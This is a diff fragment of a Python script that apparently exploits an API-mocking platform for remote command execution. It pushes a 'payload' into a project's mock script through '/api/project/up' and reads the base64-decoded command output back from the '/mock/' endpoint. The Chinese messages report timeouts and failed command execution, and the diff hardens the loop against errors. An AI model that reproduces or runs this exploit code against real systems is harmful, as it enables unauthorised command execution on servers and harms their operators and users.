@@ -89,18 +89,20 @@ def main(target):
             data = {
                 "id":projid,"project_mock_script":payload,"is_mock_open":True
             }
-            up = requests.post(url+"/api/project/up",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
-            out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5)
-            print("out:")
             try:
+                up = requests.post(url+"/api/project/up",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
+                out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5)
+            except:
+                print("执行超时或者执行被挂起(top等命令)")
+                continue
+            try:
+                print("out:")
                 print(base64.b64decode(out.text.encode()).decode().strip())
             except:
-                pass
-                print("命令执行失败")
                 print(out.json())
+                print("命令执行失败")
+                continue
     except:
-        # print("Unexpected error:", sys.exc_info()[0])
-        # raise
-        print("连接超时")
+        print("执行失败：",sys.exc_info()[0])
 if __name__ == "__main__":
     main()
